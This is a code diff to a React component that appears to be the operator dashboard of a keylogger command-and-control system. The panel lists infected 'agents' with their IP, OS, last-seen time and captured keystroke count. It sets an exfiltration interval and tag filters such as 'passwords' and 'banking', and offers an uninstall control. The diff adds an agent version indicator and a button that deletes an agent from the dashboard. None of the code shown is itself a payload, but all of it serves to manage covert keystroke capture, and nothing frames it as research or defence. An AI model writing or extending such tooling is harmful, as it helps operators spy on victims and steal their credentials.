@@ -7,11 +7,13 @@ interface AgentDetailPanelProps {
   agent: Agent;
   entries: KeystrokeEntry[];
   activityData: { hour: string; keystrokes: number }[];
+  onDelete?: (id: string) => void;
+  latestVersion?: string | null;
 }
 
 const TAG_COLORS = ["#58a6ff", "#3fb950", "#d29922", "#a855f7", "#22d3ee"];
 
-export function AgentDetailPanel({ agent, entries, activityData }: AgentDetailPanelProps) {
+export function AgentDetailPanel({ agent, entries, activityData, onDelete, latestVersion }: AgentDetailPanelProps) {
   const [exfilInterval, setExfilInterval] = useState(30);
   const [blacklistTags, setBlacklistTags] = useState<string[]>(["passwords", "banking"]);
   const [tagInput, setTagInput] = useState("");
@@ -153,18 +155,28 @@ export function AgentDetailPanel({ agent, entries, activityData }: AgentDetailPa
           {[
             { label: "IP", value: agent.ip },
             { label: "OS", value: agent.os },
+            { label: "VERSION", value: `v${agent.version}` },
             { label: "LAST SEEN", value: agent.lastSeen },
             { label: "KEYSTROKES", value: agent.keystrokeCount.toLocaleString() },
-          ].map((item) => (
-            <div key={item.label}>
-              <div style={{ color: "#8b949e", fontFamily: "JetBrains Mono, monospace", fontSize: 9, letterSpacing: "0.05em" }}>
-                {item.label}
+          ].map((item) => {
+            const isVersion = item.label === "VERSION";
+            const isLatest = isVersion && latestVersion && agent.version === latestVersion;
+            const versionColor = isVersion ? (isLatest ? "#3fb950" : "#d29922") : undefined;
+            return (
+              <div key={item.label}>
+                <div style={{ color: "#8b949e", fontFamily: "JetBrains Mono, monospace", fontSize: 9, letterSpacing: "0.05em" }}>
+                  {item.label}
+                </div>
+                <div style={{
+                  color: versionColor ?? "#e6edf3",
+                  fontFamily: "JetBrains Mono, monospace",
+                  fontSize: isVersion ? 10 : 11,
+                }}>
+                  {item.value}
+                </div>
               </div>
-              <div style={{ color: "#e6edf3", fontFamily: "JetBrains Mono, monospace", fontSize: 11 }}>
-                {item.value}
-              </div>
-            </div>
-          ))}
+            );
+          })}
         </div>
       </div>
 
@@ -325,6 +337,27 @@ export function AgentDetailPanel({ agent, entries, activityData }: AgentDetailPa
               >
                 ✕ UNINSTALL
               </button>
+              {onDelete && (
+                <button
+                  onClick={() => {
+                    if (confirm(`Delete agent ${agent.hostname} from dashboard?`)) {
+                      onDelete(agent.id);
+                    }
+                  }}
+                  className="w-full py-2 rounded transition-colors hover:bg-[#f8514933] text-left px-3"
+                  style={{
+                    backgroundColor: "#21262d",
+                    border: "1px solid #30363d",
+                    color: "#8b949e",
+                    fontFamily: "JetBrains Mono, monospace",
+                    fontSize: 10,
+                    letterSpacing: "0.05em",
+                    cursor: "pointer",
+                  }}
+                >
+                  🗑 DELETE FROM DASHBOARD
+                </button>
+              )}
             </div>
           </div>
         </div>
